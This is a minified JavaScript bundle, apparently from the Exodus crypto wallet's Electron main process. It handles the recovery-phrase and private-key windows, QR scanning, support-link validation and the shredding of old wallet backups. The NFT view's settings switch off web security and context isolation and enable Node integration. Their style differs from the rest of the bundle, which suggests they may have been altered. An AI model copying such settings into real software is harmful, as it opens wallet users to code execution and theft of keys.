                        writable: !0,
                        value: void 0
                    }), Object.defineProperty(this, O, {
                        writable: !0,
                        value: void 0
                    }), o()(i === m, "SafeError: use SafeError.from()"), u(this, y)[y] = e, u(this, g)[g] = t, u(this, E)[E] = n, u(this, v)[v] = null == r ? void 0 : r.map(e => ({
                        ...e
                    })), u(this, O)[O] = Date.now()
                }
            }
            b.hints = p;
            var y = c("name"),
                g = c("code"),
                E = c("hint"),
                v = c("stackFrames"),
                O = c("timestamp");
            const S = new b({
                initSymbol: m,
                name: "SafeErrorFailedToParse"
            })
        }, function(e, t, n) {
            "use strict";
            t.default = (e => e.replaceAll(/(?:[A-Za-z]{3,20}\s+){11}[A-Za-z]{3,20}/gu, "****").replaceAll(/(?:0x)?[\dA-Fa-f]{20,}/gu, "****").replaceAll(/[1-9A-HJ-NP-Za-km-z]{50,}/gu, "****").replaceAll(/(?:[\d+/A-Za-z]{4}){3,}(?:[\d+/A-Za-z]{2}==|[\d+/A-Za-z]{3}=|[\d+/A-Za-z]{4})/gu, "****"))
        }, function(e) {
            e.exports = {
                name: "exodus",
                productName: "Exodus",
                version: "25.24.2",
                releaseDate: "25.6.9",
                description: "Secure, manage, and trade blockchain assets."
            }
        }, function(e, t, n) {
            "use strict";
            const r = e => "string" != typeof e ? e.toLowerCase() : e;

            function o(e, t) {
                for (const n of ["alt", "control", "shift", "meta"])
                    if (Boolean(e[n]) !== Boolean(t[n])) return !1;
                return e.code === t.code && void 0 !== e.code || r(e.key) === r(t.key) && void 0 !== e.key
            }
            const i = new WeakMap;
            e.exports = {
                registerShortcut: function(e, t, n) {
                    (function(e) {
                        if (i.has(e)) return i.get(e);
                        const t = [];
                        i.set(e, t);
                        const n = (e, n) => {
                            if ("keyUp" !== n.type)
                                for (const {
                                        inputStamp: e,
                                        callback: r
                                    }
                                    of t)
                                    if (o(e, n)) return r()
                        };
                        return e.on("before-input-event", n), e.once("closed", () => e.removeListener("before-input-event", n)), t
                    })(e.webContents).push({
                        inputStamp: t,
                        callback: n
                    })
                }
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(11),
                o = n.n(r);
            t.default = o()(["Window", [
                ["Minimize", "CmdOrCtrl+M", "minimize"]
            ]])
        }, function(e, t, n) {
            "use strict";
            var r = n(11),
                o = n.n(r);
            t.default = o()(["Edit", [
                ["Undo", "CmdOrCtrl+Z", "undo"],
                ["Redo", "Shift+CmdOrCtrl+Z", "redo"], "-", ["Cut", "CmdOrCtrl+X", "cut"],
                ["Copy", "CmdOrCtrl+C", "copy"],
                ["Paste", "CmdOrCtrl+V", "paste"],
                ["Select All", "CmdOrCtrl+A", "selectall"]
            ]])
        }, function(e, t, n) {
            "use strict";
            n.d(t, "init", function() {
                return f
            });
            var r = n(0),
                o = n(17),
                i = n(8),
                s = n(10),
                a = n(5),
                c = n(7),
                u = n(18);
            const l = {
                ...c.default,
                backgroundColor: "#fff",
                autoHideMenuBar: !0,
                fullscreen: !1,
                fullscreenable: !1,
                maximizable: !1,
                resizable: !1,
                show: !1,
                title: "View Recovery Phrase",
                webPreferences: {
                    ...c.integration,
                    partition: "persist:recovery"
                }
            };
            let d = null;

            function f() {
                return d = new r.BrowserWindow({
                    ...l
                }), Object(i.registerWebContents)(d.webContents, "recovery"), d.loadURL(Object(u.getHtmlUrl)({
                    app: r.app,
                    filePath: a.WINDOW_RECOVERY
                })), Object(o.default)() && Object(s.default)({
                    windowHandle: d.webContents,
                    windowId: "recovery"
                }), d.webContents.on("will-navigate", e => {
                    e.preventDefault()
                }), d.webContents.setWindowOpenHandler(e => ({
                    action: "deny"
                })), r.app.on("before-quit", () => {
                    d.isDestroyed() || d.close()
                }), d.webContents.once("dom-ready", () => d.show()), d
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "updateNftsViewBounds", function() {
                return g
            });
            var r = n(45),
                o = n.n(r),
                i = n(0),
                s = n(15),
                a = n(1),
                c = n(23),
                u = n(4),
                l = n(8),
                d = n(3),
                f = n(5),
                p = n(29),
                h = n(27),
                w = n(19);
            let m = null;
            const b = () => {
                d.appWindows.background.contentView.removeChildView(m), d.appWindows.ui.webContents.focus()
            };
            let y = 0;
            const g = e => {
                y = e || y, m && Object(h.updateViewBounds)(m, y)
            };
            p.maximizeWorkaroundHandlers.add(() => g()), w.navbarHeightChangeHandlers.add(g), i.protocol.registerSchemesAsPrivileged([{
                scheme: "exodus-nfts-api",
                privileges: {
                    bypassCSP: !0,
                    secure: !0,
                    supportFetchAPI: !0
                }
            }]), u.rpcMain.handle("nfts:load", async () => {
                if (m) throw new Error("Already loaded!");
                m = new i.WebContentsView({
                    webPreferences: {
                        webSecurity: 0,
                        enableRemoteModule: 1,
                        contextIsolation: 0,
                        nodeIntegration: 1,
                        nodeIntegrationInWorker: !1,
                        partition: "nfts",
                        sandbox: !0,
                        spellcheck: !1,
                        webgl: !1,
                        plugins: !1,
                        safeDialogs: !0,
                        disableDialogs: !0,
                        backgroundColor: "#00000000",
                        transparent: !0
                    },
                    transparent: !0
                }), Object(l.registerWebContents)(m.webContents, "nfts"), Object(c.registerWebContentsView)(m), Object(h.updateViewBounds)(m, y), d.appWindows.background.contentView.on("bounds-changed", () => Object(h.updateViewBounds)(m, y)), d.appWindows.ui.webContents.on("devtools-reload-page", () => {
                    b(), Object(c.destroyWebContentsView)(m)
                });
                const {
                    session: e
                } = m.webContents;
                e.protocol.registerStringProtocol("exodus-nfts-api", (e, t) => {
                    try {
                        const t = new s.URL(e.url).searchParams.get("data");
                        if (!t) throw new Error("No message found in nfts IPC request!");
                        d.appWindows.ui.webContents.send("exodus-nfts-api", {
                            messageString: t
                        })
                    } catch (e) {
                        console.error("Could not parse exodus-nfts-api request!"), console.error(e)
                    }
                    t({
                        mimeType: "text/plain",
                        data: "ok"
                    })
                }), a.ENV_DEV && Object(h.showDevTools)(m), await m.webContents.loadFile(f.WINDOW_NFTS), m.webContents.debugger.attach("1.3"), m.webContents.on("devtools-reload-page", () => {
                    Object(u.targeted)("ui", "nfts-reload")
                })
            }), u.rpcMain.handle("nfts:showDevTools", async () => {
                Object(h.showDevTools)(m)
            }), u.rpcMain.handle("nfts:show", () => {
                d.appWindows.background.contentView.addChildView(m), d.appWindows.background.contentView.removeChildView(d.appWindows.ui), d.appWindows.background.contentView.addChildView(d.appWindows.ui), Object(h.updateViewBounds)(m, y), Object(h.refocusView)(m)
            }), u.rpcMain.handle("nfts:hide", () => {
                b()
            }), u.rpcMain.handle("nfts:goBack", () => {
                const e = m.webContents.canGoBack();
                return e && m.webContents.goBack(), e
            }), u.rpcMain.handle("nfts:api-receive", async (e, {
                dataString: t
            }) => {
                const n = JSON.stringify(JSON.parse(t));
                await m.webContents.executeJavaScript(`window._exodus_nfts_api.receive(${o()(n)}),0`)
            }), u.rpcMain.on("nfts:pointer", (e, t) => {
                const n = Object(h.toInputEvent)(t);
                n && (["mousedown", "click"].includes(t.type) && m.webContents.focus(), m.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n))
            })
        }, function(e, t, n) {
            "use strict";
            var r = n(1),
                o = n(23),
                i = n(3),
                s = n(78);
            t.default = ((e, t) => {
                if (i.appWindows.ui.webContents.zoomFactor === e) return;
                const n = r.MIN_WIDTH * e,
                    a = r.MIN_HEIGHT * e;
                i.appWindows.background.setMinimumSize(n, a);
                const [c, u] = i.appWindows.background.getSize();
                return (t || c < n || u < a) && ((e, t) => {
                    try {
                        i.appWindows.background.setSize(e, t, !1)
                    } catch (e) {
                        console.error("failed to update window size", e)
                    }
                })(n, a), Object(o.allWebContents)().forEach(t => {
                    t.zoomFactor = e, Object(s.updateNftsViewBounds)()
                }), e
            })
        }, function(e, t, n) {
            "use strict";
            var r = n(1);
            const o = !r.ENV_PROD,
                i = ["file-system", "notifications", "presentation-api", "speech-api", "pepper-3d", "shared-workers", ["blink-features", ["FileSystem", "MediaSession", "Serial", "WebAuth", "WebBluetooth", "WebHID", "WebNFC", "WebOTP", "WebUSB", "WebXR", "WebScheduler", "WindowPlacement", "WindowSegments"].join(",")],
                    ["features", ["Reporting", "WebAuthentication", "WebGPUService", "WebNFC", "WebOTP", "WebPermissionsApi", "WebUSB", "WebXR"].join(",")]
                ];
            t.default = [...[], ...(o || r.ENV_BUILD_EDEN, []), ...i]
        }, function(e, t, n) {
            "use strict";
            n.d(t, "init", function() {
                return w
            });
            var r = n(0),
                o = n(22),
                i = n(17),
                s = n(8),
                a = n(10),
                c = n(13),
                u = n(5),
                l = n(7),
                d = n(18);
            const f = {
                transparent: !0,
                width: 850,
                height: 500,
                show: !0,
                fullscreen: !1,
                fullscreenable: !1,
                maximizable: !1,
                minimizable: !1,
                resizable: !1,
                title: "Scan QR Code",
                webPreferences: {
                    ...l.isolation,
                    partition: "scan-qr"
                },
                frame: !1
            };
            let p, h = !1;

            function w(e, t, n) {
                if (console.log(`[app-run] EVENT wallet:qrCodeScan: payload = ${n&&JSON.stringify(n)}`), !n || n.assetName)
                    if (p) p.send("wallet:qr:changeState", n), p.show(), e.hide();
                    else {
                        if (h) return;
                        h = !0,
                            function(e, t, n) {
                                const l = new r.BrowserWindow(f);
                                Object(s.registerWebContents)(l.webContents, "scan-qr"), Object(c.forwardErrors)(l.webContents, "scan-qr"), l.loadURL(Object(d.getHtmlUrl)({
                                    app: r.app,
                                    filePath: u.WINDOW_SCAN_QR,
                                    hash: Object(o.encode)(e)
                                })), Object(i.default)() && (Object(a.default)({
                                    windowHandle: l.webContents,
                                    windowId: "scanQR"
                                }), l.webContents.zoomFactor = n.webContents.zoomFactor, l.show());
                                let p = !1;
                                return r.app.on("before-quit", () => {
                                    p = !0, l.isDestroyed() || l.close()
                                }), l.on("close", e => {
                                    p || (e.preventDefault(), l.hide())
                                }), new Promise((e, t) => {
                                    l.webContents.once("dom-ready", () => {
                                        l.show(), e(l)
                                    })
                                })
                            }(n, 0, t).then(t => {
                                p = t, e.hide(), t.on("close", () => {
                                    e.show()
                                }), h = !1
                            })
                    }
                else n && n.qrData ? (p.hide(), e.show(), console.log(`[app-run] QR code decoded: ${n.qrData}`), t.webContents.send("wallet:qrCodeValue", n.qrData)) : n.error && (console.log(`[app-run] QR scan window error: ${n.error}`), p.hide(), e.show())
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "init", function() {
                return h
            });
            var r = n(0),
                o = n(22),
                i = n(17),
                s = n(8),
                a = n(10),
                c = n(5),
                u = n(7),
                l = n(18);
            const d = {
                ...u.default,
                backgroundColor: "#FFFFFF",
                fullscreen: !1,
                fullscreenable: !1,
                width: 900,
                height: 500,
                show: !1,
                title: "PRIVATE KEYS",
                minimizable: !1,
                maximizable: !1,
                alwaysOnTop: !0,
                webPreferences: {
                    ...u.isolation,
                    partition: "keyviewer"
                },
                modal: !0
            };
            let f = null;
            let p = 0;

            function h(e, t, n) {
                return d.webPreferences.partition = `keyviewer-${p++}`, f = new r.BrowserWindow({
                    ...d,
                    parent: e
                }), Object(s.registerWebContents)(f.webContents, "keyviewer"), f.loadURL(Object(l.getHtmlUrl)({
                    app: r.app,
                    hash: Object(o.encode)(n),
                    filePath: c.WINDOW_KEYVIEWER
                })), Object(i.default)() && Object(a.default)({
                    windowHandle: f.webContents,
                    windowId: "keyviewer"
                }), f.on("close", e => {
                    setImmediate(() => {
                        f.destroy()
                    })
                }), f.webContents.once("dom-ready", () => {
                    f.webContents.zoomFactor = t.webContents.zoomFactor, f.show()
                }), f
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "validate", function() {
                return s
            });
            const r = [/^https:\/\/support\.exodus\.(io|com)\/[a-zA-Z0-9/_-]*(#[a-zA-Z0-9%_-]+)?$/, /^https:\/\/www\.exodus\.com\/support(\/[a-zA-Z0-9/_-]*)?(#[a-zA-Z0-9%_-]+)?$/, /^https:\/\/etherscan\.io\/tx\/0x[a-zA-Z0-9]+$/, /^https:\/\/polygonscan\.com\/tx\/0x[a-zA-Z0-9]+$/, /^https:\/\/youtu\.be\/jRLOG8fLwuA$/],
                o = [/^support@exodus\.(io|com)$/];

            function i(e, t) {
                return "string" == typeof e ? e === t : e.test(t)
            }

            function s(e) {
                if ("string" != typeof e) return !1;
                let t;
                try {
                    t = new URL(e)
                } catch (e) {
                    return !1
                }
                if (t.href !== e) return !1;
                if (!e.startsWith(t.protocol)) return !1;
                switch (t.protocol) {
                    case "mailto:":
                        if (e !== `mailto:${t.pathname}${t.search}`) return !1;
                        if (t.search) {
                            if (![`?${t.searchParams}`, `?${function(e){const t=[];for(const[n,r]of e)t.push(`${encodeURIComponent(n)}=${encodeURIComponent(r)}`);return t.join("&")}(t.searchParams)}`].includes(t.search)) return !1;
                            const e = new Set(["subject", "body"]);
                            for (const [n] of t.searchParams)
                                if (!e.has(n)) return !1
                        }
                        return o.some(e => i(e, t.pathname));
                    case "https:":
                        return r.some(t => i(t, e))
                }
                return !1
            }
        }, function(e, t) {
            e.exports = require("events")
        }, function(e, t, n) {
            const r = n(98),
                {
                    randomBytes: o
                } = n(61);
            e.exports = async function(e, t = {}) {
                let n, i;
                const s = Buffer.alloc(16384);
                try {
                    const a = await r.stat(e);
                    if (!a.isFile()) throw new Error(`${e} is not file`);
                    let c = a.size;
                    if (t.size) {
                        const e = t.size.toString().match(/^(\d+)([KMG]?)$/);
                        if (null === e) throw new Error(`invalid size: ${t.size}`);
                        c = parseInt(e[1], 10) * ("K" === e[2] ? 1024 : "M" === e[2] ? 1048576 : "G" === e[2] ? 1073741824 : 1)
                    }
                    let u = 3;
                    if (t.iterations) {
                        if (null === t.iterations.toString().match(/^\d+$/)) throw new Error(`invalid iterations: ${t.iterations}`);
                        u = parseInt(t.iterations, 10)
                    }
                    if (!(u >= 1)) throw new Error(`invalid iterations: ${t.iterations}`);
                    if (t.zero && (u -= 1), n = await r.open(e, "w"), t.randomSource) {
                        i = await r.open(t.randomSource, "r");
                        let e = 0;
                        for (let r = 0, o = 0; r < u; ++r)
                            for (; o < c;) {
                                const r = Math.min(s.length, c - o),
                                    {
                                        bytesRead: a
                                    } = await i.read(s, 0, r, e);
                                if (0 === a) throw new Error(`not enough data in ${t.randomSource}`);
                                e += a;
                                const {
                                    bytesWritten: u
                                } = await n.write(s, 0, a, o);
                                if (u !== a) throw new Error("lost data on overwrite");
                                o += a
                            }
                        await i.close(), i = void 0
                    } else
                        for (let e = 0; e < u; ++e)
                            for (let e = 0; e < c;) {
                                const t = Math.min(16384, c - e),
                                    r = o(t),
                                    {
                                        bytesWritten: i
                                    } = await n.write(r, 0, t, e);
                                if (i !== t) throw new Error("lost data on overwrite");
                                e += t
                            }
                    if (t.zero) {
                        s.fill(0);
                        for (let e = 0; e < c;) {
                            const t = Math.min(s.length, c - e),
                                {
                                    bytesWritten: r
                                } = await n.write(s, 0, t, e);
                            if (r !== t) throw new Error("lost data on overwrite");
                            e += t
                        }
                    }
                    await n.close(), n = void 0, t.remove && await r.unlink(e)
                } catch (e) {
                    throw await Promise.all([n, i].filter(e => !!e).map(e => e.close().catch(() => {}))).catch(() => {}), e
                }
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(9),
                o = n.n(r),
                i = n(54),
                s = n.n(i),
                a = n(2),
                c = n.n(a),
                u = n(85),
                l = n.n(u),
                d = n(28);
            t.default = async function() {
                const e = Object(d.walletBackupDir)();
                let t;
                try {
                    t = await o.a.readdir(e)
                } catch (e) {
                    if ("ENOENT" === e.code) return;
                    throw e
                }
                const n = Date.now() - s()("90 days"),
                    r = t.filter(e => new Date(e.split("_")[0]).getTime() < n).map(t => c.a.resolve(e, t));
                if (!r.length) return;
                const i = {
                    iterations: 1
                };
                await Promise.all(r.map(e => (async function(e, t) {
                    const n = await o.a.readdir(e);
                    return Promise.all(n.map(n => l()(c.a.join(e, n), t)))
                })(c.a.join(e, "exodus.wallet"), i))), await Promise.all(r.map(e => o.a.remove(e)))
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getAutoUpdateUrls", function() {
                return s
            });
            var r = n(41),
                o = n.n(r),
                i = n(1);
            const s = e => {
                const t = e ? `feed-${e}` : "feed";
                return {
                    darwin: o()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin.json`),
                    darwinArm: o()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin-arm64.json`),
                    linux: o()(i.AUTO_UPDATE_BASE_URL, `${t}/linux-${process.arch}.json`),
                    win32: o()(i.AUTO_UPDATE_BASE_URL, `${t}/win32-${process.arch}`)
                }
            }
        }, function(e, t) {
            function n(e) {
                if (!(this instanceof n)) return new n(e);
                this.value = e
            }

            function r(e, t, n) {
                var r = [],
                    i = [],
                    s = !0;
                return function e(a) {
                    var c = n ? o(a) : a,
                        u = {},
                        l = {
                            node: c,
                            node_: a,
                            path: [].concat(r),
                            parent: i.slice(-1)[0],
                            key: r.slice(-1)[0],
                            isRoot: 0 === r.length,
                            level: r.length,
                            circular: null,
                            update: function(e) {
                                l.isRoot || (l.parent.node[l.key] = e), l.node = e
                            },
                            delete: function() {
                                delete l.parent.node[l.key]
                            },
                            remove: function() {
                                Array.isArray(l.parent.node) ? l.parent.node.splice(l.key, 1) : delete l.parent.node[l.key]
                            },
                            before: function(e) {
                                u.before = e
                            },
                            after: function(e) {
                                u.after = e
                            },
                            pre: function(e) {
                                u.pre = e
                            },
                            post: function(e) {
                                u.post = e
                            },
                            stop: function() {
                                s = !1
                            }
                        };
                    if (!s) return l;
                    if ("object" == typeof c && null !== c) {
                        l.isLeaf = 0 == Object.keys(c).length;
                        for (var d = 0; d < i.length; d++)
                            if (i[d].node_ === a) {
                                l.circular = i[d];
                                break
                            }
                    } else l.isLeaf = !0;
                    l.notLeaf = !l.isLeaf, l.notRoot = !l.isRoot;
                    var f = t.call(l, l.node);
                    if (void 0 !== f && l.update && l.update(f), u.before && u.before.call(l, l.node), "object" == typeof l.node && null !== l.node && !l.circular) {
                        i.push(l);
                        var p = Object.keys(l.node);
                        p.forEach(function(t, o) {
                            r.push(t), u.pre && u.pre.call(l, l.node[t], t);
                            var i = e(l.node[t]);
                            n && Object.hasOwnProperty.call(l.node, t) && (l.node[t] = i.node), i.isLast = o == p.length - 1, i.isFirst = 0 == o, u.post && u.post.call(l, i), r.pop()
                        }), i.pop()
                    }
                    return u.after && u.after.call(l, l.node), l
                }(e).node
            }

            function o(e) {
                var t;
                return "object" == typeof e && null !== e ? (t = Array.isArray(e) ? [] : e instanceof Date ? new Date(e) : e instanceof Boolean ? new Boolean(e) : e instanceof Number ? new Number(e) : e instanceof String ? new String(e) : Object.create(Object.getPrototypeOf(e)), Object.keys(e).forEach(function(n) {
                    t[n] = e[n]
                }), t) : e
            }
            e.exports = n, n.prototype.get = function(e) {
                for (var t = this.value, n = 0; n < e.length; n++) {
                    var r = e[n];
                    if (!Object.hasOwnProperty.call(t, r)) {
                        t = void 0;
                        break
                    }
                    t = t[r]
                }
                return t
            }, n.prototype.set = function(e, t) {
                for (var n = this.value, r = 0; r < e.length - 1; r++) {
                    var o = e[r];
                    Object.hasOwnProperty.call(n, o) || (n[o] = {}), n = n[o]
                }
                return n[e[r]] = t, t
            }, n.prototype.map = function(e) {
                return r(this.value, e, !0)
            }, n.prototype.forEach = function(e) {
                return this.value = r(this.value, e, !1), this.value
            }, n.prototype.reduce = function(e, t) {
                var n = 1 === arguments.length,
                    r = n ? this.value : t;
                return this.forEach(function(t) {
                    this.isRoot && n || (r = e.call(this, r, t))
                }), r
            }, n.prototype.deepEqual = function(e) {
                if (1 !== arguments.length) throw new Error("deepEqual requires exactly one object to compare against");
                var t = !0,
                    r = e;
                return this.forEach(function(o) {
                    var i = function() {
                        t = !1
                    }.bind(this);
                    if (!this.isRoot) {
                        if ("object" != typeof r) return i();
                        r = r[this.key]
                    }
                    var s = r;
                    this.post(function() {
                        r = s
                    });
                    var a = function(e) {
                        return Object.prototype.toString.call(e)
                    };
                    if (this.circular) n(e).get(this.circular.path) !== s && i();
                    else if (typeof s != typeof o) i();
                    else if (null === s || null === o || void 0 === s || void 0 === o) s !== o && i();
                    else if (s.__proto__ !== o.__proto__) i();
                    else if (s === o);
                    else if ("function" == typeof s) s instanceof RegExp ? s.toString() != o.toString() && i() : s !== o && i();
                    else if ("object" == typeof s)
                        if ("[object Arguments]" === a(o) || "[object Arguments]" === a(s)) a(s) !== a(o) && i();
                        else if (s instanceof Date || o instanceof Date) s instanceof Date && o instanceof Date && s.getTime() === o.getTime() || i();
                    else {
                        var c = Object.keys(s),
                            u = Object.keys(o);
                        if (c.length !== u.length) return i();
                        for (var l = 0; l < c.length; l++) {
                            var d = c[l];
                            Object.hasOwnProperty.call(o, d) || i()
                        }
                    }
                }), t
            }, n.prototype.paths = function() {
                var e = [];
                return this.forEach(function(t) {
                    e.push(this.path)
                }), e
            }, n.prototype.nodes = function() {
                var e = [];
                return this.forEach(function(t) {
                    e.push(this.node)
                }), e
            }, n.prototype.clone = function() {
                var e = [],
                    t = [];
                return function n(r) {
                    for (var i = 0; i < e.length; i++)
                        if (e[i] === r) return t[i];
                    if ("object" == typeof r && null !== r) {
                        var s = o(r);
                        return e.push(r), t.push(s), Object.keys(r).forEach(function(e) {
                            s[e] = n(r[e])
                        }), e.pop(), t.pop(), s
                    }
                    return r
                }(this.value)
            }, Object.keys(n.prototype).forEach(function(e) {
                n[e] = function(t) {
                    var r = [].slice.call(arguments, 1),
                        o = n(t);
                    return o[e].apply(o, r)
                }
            })
        }, function(e, t, n) {
            "use strict";
            var r = n(88),
                o = n.n(r);
            t.default = (e => void 0 === globalThis.Buffer ? e : (o()(e).forEach(function(e) {
                e instanceof Uint8Array && this.update(globalThis.Buffer.from(e))
            }), e))
        }, function(e, t, n) {
            "use strict";
            n.d(t, "wrapIpc", function() {
                return a
            });
            var r = n(89);
            const o = new WeakMap,
                i = new WeakMap;

            function s(e, t, n) {
                const s = i.get(e);
                if (s && (s.filter !== t || s.useBuffers !== n)) throw new Error("Attempting to register the same handler with different parameters");
                i.set(e, {
                    filter: t,
                    useBuffers: n
                });
                const a = o.get(e);
                if (a) return a;
                const c = (o, ...i) => {
                    if (!0 !== t(o)) return;
                    const s = n ? Object(r.default)(i) : i;
                    return e(o, ...s)
                };
                return o.set(e, c), c
            }

            function a(e, t) {
                return {
                    on(n, r, o = !0) {
                        e.on(n, s(r, t, o))
                    },
                    once(n, r, o = !0) {
                        e.once(n, s(r, t, o))
                    },
                    removeListener(t, n) {
                        e.removeListener(t, o.get(n))
                    },
                    removeAllListeners(t) {
                        e.removeAllListeners(t)
                    },
                    handle(n, r, o = !0) {
                        e.handle(n, s(r, t, o))
                    },
                    removeHandler(t) {
                        e.removeHandler(t)
                    },
                    send(...t) {
                        e.send(...t)
                    },
                    sendSync: (...t) => e.sendSync(...t),
                    invoke: (...t) => e.invoke(...t)
                }
            }
        }, function(e, t) {
            function n(e) {
                return e instanceof Error ? {
                    ...e,
                    name: e.name,
                    message: e.message,
                    stack: r(e.stack)
                } : {
                    name: e.name || "UNKNOWN",
                    message: JSON.stringify(e)
                }
            }

            function r(e) {
                return e.replace(/\/Users\/[^/]+/g, "").replace(/\\Users\\[^\\]+/g, "").replace(/\/home\/[^/]+/g, "")
            }
            e.exports = {
                toObject: n,
                JSONReplacer: function(e, t) {
                    return t instanceof Error ? n(t) : t
                },
                cleanStack: r
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "createServerImplementation", function() {
                return i
            });
            var r = n(91),
                o = n(65);

            function i(e, t, n, i, s, a, {
                wrap: c,
                unwrap: u
            } = {}) {
                const l = `${o.CHANNEL_PREFIX}:${i}:call`,
                    d = async (e, l) => {
                        const d = n(e, l);
                        if (!s.includes(d)) return void console.error(`Skipping unexpected message from (${d}) to channel: ${i}`);
                        const {
                            func: f,
                            args: p,
                            token: h
                        } = l.payload, [w, m] = await async function(e, t) {
                            if ("function" == typeof a[e]) try {
                                u && (t = u(e, t));
                                let n = await a[e](...t);
                                return c && (n = c(e, n)), [null, n]
                            } catch (e) {
                                return [e, null]
                            }
                            try {
                                return [null, a[e]]
                            } catch (e) {
                                return [e]
                            }
                        }(f, p), b = w ? Object(r.toObject)(w) : null;
                        t(d, `${o.CHANNEL_PREFIX}:${i}:response:${h}`, [b, m])
                    };
                return e.on(l, d), {
                    stop: () => e.removeListener(l, d)
                }
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "prepareMetaEntry", function() {
                return o
            });
            var r = n(67);

            function o(e, {
                url: t,
                domains: n,
                ...o
            }) {
                if (Object.keys(o).length > 0) throw new Error("Unexpected argument");
                if (!r.meta.has(e)) throw new Error(`Unknown webContents type: '${e}'`);
                const i = {
                    ...r.meta.get(e)
                };
                if (i.parallel && !i.multiple) throw new Error("`parallel: true` requires `multiple: true`");
                if (i.parallel && i.persistent) throw new Error("Can not use persistent session in parallel");
                if (i.parallel && i.ipc) throw new Error("To support targeted IPC handling, webContents could not be .parallel");
                if (i.hasOwnProperty("reusable")) throw new Error("Entry shouldn't have a .reusable property");
                if (i.reusable = i.persistent && i.multiple, i.offline) {
                    if (i.domains || n) throw new Error(`Domains can not be specified for offline ${e}`);
                    if (i.protocols.length > 1 || "file:" !== i.protocols[0]) throw new Error(`Offline session can use only file: protocol for ${e}`);
                    i.domains = []
                } else {
                    if (!!i.domains == !!n) throw new Error(`Domains argument (un)expected for '${e}'`);
                    i.domains || (i.domains = n)
                }
                if (!!i.url == !!t) throw new Error(`Url argument (un)expected for '${e}'`);
                if (i.url || (i.url = t), i.hasOwnProperty("type")) throw new Error("Entry shouldn't have a .type property");
                return i.type = e, i.flags = new Set(i.flags || []), Object.freeze(i), i
            }
        }, function(e, t, n) {
            e.exports = n(73)
        }, function(e, t, n) {
            "use strict";
            n.d(t, "omitUndefined", function() {
                return r
            });
            const r = e => Object.fromEntries(Object.entries(e).filter(([, e]) => void 0 !== e))
        }, function(e, t) {
            function n(e, t) {
                if (!e) throw new Error(t || "Assertion failed")
            }
            e.exports = n, n.equal = function(e, t, n) {
                if (e != t) throw new Error(n || "Assertion failed: " + e + " != " + t)
            }
        }, function(e) {
            e.exports = ["about", "close", "copy", "cut", "delete", "front", "help", "hide", "hideothers", "minimize", "paste", "pasteandmatchstyle", "quit", "redo", "resetzoom", "selectall", "services", "startspeaking", "stopspeaking", "togglefullscreen", "undo", "unhide", "window", "zoom", "zoomin", "zoomout"]
        }, function(e, t) {
            e.exports = require("fs/promises")
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(2),
                i = n(59).copySync,
                s = n(47).removeSync,
                a = n(21).mkdirpSync,
                c = n(38);

            function u(e, t, n) {
                try {
                    r.renameSync(e, t)
                } catch (r) {
                    if ("EXDEV" !== r.code) throw r;
                    return function(e, t, n) {
                        return i(e, t, {
                            overwrite: n,
                            errorOnExist: !0
                        }), s(e)
                    }(e, t, n)
                }
            }
            e.exports = function(e, t, n) {
                const i = (n = n || {}).overwrite || n.clobber || !1,
                    {
                        srcStat: l,
                        isChangingCase: d = !1
                    } = c.checkPathsSync(e, t, "move", n);
                return c.checkParentPathsSync(e, l, t, "move"),
                    function(e) {
                        const t = o.dirname(e);
                        return o.parse(t).root === t
                    }(t) || a(o.dirname(t)),
                    function(e, t, n, o) {
                        if (o) return u(e, t, n);
                        if (n) return s(t), u(e, t, n);
                        if (r.existsSync(t)) throw new Error("dest already exists.");
                        return u(e, t, n)
                    }(e, t, i, d)
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(2),
                i = n(59).copy,
                s = n(47).remove,
                a = n(21).mkdirp,
                c = n(30).pathExists,
                u = n(38);

            function l(e, t, n, r, o) {
                return r ? d(e, t, n, o) : n ? s(t, r => r ? o(r) : d(e, t, n, o)) : void c(t, (r, i) => r ? o(r) : i ? o(new Error("dest already exists.")) : d(e, t, n, o))
            }

            function d(e, t, n, o) {
                r.rename(e, t, r => r ? "EXDEV" !== r.code ? o(r) : function(e, t, n, r) {
                    i(e, t, {
                        overwrite: n,
                        errorOnExist: !0
                    }, t => t ? r(t) : s(e, r))
                }(e, t, n, o) : o())
            }
            e.exports = function(e, t, n, r) {
                "function" == typeof n && (r = n, n = {});
                const i = (n = n || {}).overwrite || n.clobber || !1;
                u.checkPaths(e, t, "move", n, (n, s) => {
                    if (n) return r(n);
                    const {
                        srcStat: c,
                        isChangingCase: d = !1
                    } = s;
                    u.checkParentPaths(e, c, t, "move", n => n ? r(n) : function(e) {
                        const t = o.dirname(e);
                        return o.parse(t).root === t
                    }(t) ? l(e, t, i, d, r) : void a(o.dirname(t), n => n ? r(n) : l(e, t, i, d, r)))
                })
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback;
            e.exports = {
                move: r(n(100)),
                moveSync: n(99)
            }
        }, function(e, t, n) {
            "use strict";
            const {
                stringify: r
            } = n(58), {
                outputFileSync: o
            } = n(57);
            e.exports = function(e, t, n) {
                const i = r(t, n);
                o(e, i, n)
            }
        }, function(e, t, n) {
            "use strict";
            const {
                stringify: r
            } = n(58), {
                outputFile: o
            } = n(57);
            e.exports = async function(e, t, n = {}) {
                const i = r(t, n);
                await o(e, i, n)
            }
        }, function(e, t, n) {
            let r;
            try {
                r = n(12)
            } catch (e) {
                r = n(26)
            }
            const o = n(14),
                {
                    stringify: i,
                    stripBom: s
                } = n(58);
            const a = {
                readFile: o.fromPromise(async function(e, t = {}) {
                    "string" == typeof t && (t = {
                        encoding: t
                    });
                    const n = t.fs || r,
                        i = !("throws" in t) || t.throws;
                    let a, c = await o.fromCallback(n.readFile)(e, t);
                    c = s(c);
                    try {
                        a = JSON.parse(c, t ? t.reviver : null)
                    } catch (t) {
                        if (i) throw t.message = `${e}: ${t.message}`, t;
                        return null
                    }
                    return a
                }),
                readFileSync: function(e, t = {}) {
                    "string" == typeof t && (t = {
                        encoding: t
                    });
